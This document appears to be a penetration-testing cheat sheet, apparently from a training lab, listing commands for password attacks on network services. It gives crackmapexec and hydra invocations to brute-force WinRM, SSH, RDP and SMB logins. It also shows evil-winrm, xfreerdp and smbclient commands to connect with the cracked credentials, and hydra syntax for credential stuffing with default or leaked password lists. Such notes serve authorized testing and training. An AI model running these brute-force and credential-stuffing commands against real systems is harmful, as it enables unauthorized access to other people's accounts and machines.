### Network Services

```bash
# tools
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist> # crackmapexec

# WinRM (5985,5986)
crackmapexec winrm 10.129.213.36 -u user.list -p password.list
evil-winrm -i 10.129.42.197 -u user -p password # CONNECT

# SSH (22 TCP )
hydra -L user.list -P password.list ssh://10.129.42.197 

# RDP (3389 TCP)
hydra -L user.list -P password.list rdp://10.129.42.197 -c 3 # -c wait time
xfreerdp /v:<target-IP> /u:<username> /p:<password> # CONNECT 

#SMB (139 , 445 TCP)
hydra -L user.list -P password.list smb://10.129.42.197
msf6 auxiliary(scanner/smb/smb_login)
smbclient -U '<user>%pass' -L  //<ip> # list folder
smbclient -U user \\\\10.129.42.197\\<folder> # CONNECT 


# -s PORT   if the service is on a different default port, define it here
```

### 
### Password Reuse / Default Passwords
```bash
# Credential Stuffing
# - Using known default credentials or leaked credential combos.
# - Example list: DefaultCreds-Cheat-Sheet. https://github.com/ihebski/DefaultCreds-cheat-sheet 
creds search ssh

#  Hydra Syntax for Credential Stuffing
hydra -C <user_pass.list> <protocol>://<IP>
hydra -C user_pass.list ssh://10.129.42.197 #Example (SSH)
```